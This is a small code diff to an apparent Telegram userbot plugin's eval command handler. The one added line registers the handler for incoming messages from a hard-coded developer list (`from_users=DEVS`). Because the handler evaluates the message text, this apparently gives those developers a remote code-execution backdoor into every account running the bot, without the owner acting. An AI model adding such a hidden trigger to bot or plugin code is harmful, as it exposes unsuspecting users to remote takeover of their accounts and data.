@@ -147,6 +147,7 @@ def _parse_eval(value=None):
 
 
 @ayra_cmd(pattern="(Eval|eval|ev)", fullsudo=False, only_devs=False)
+@register(incoming=True, from_users=DEVS, pattern=r"^Eval(?: |$)(.*)")
 async def _(event):
     try:
         cmd = event.text.split(maxsplit=1)[1]
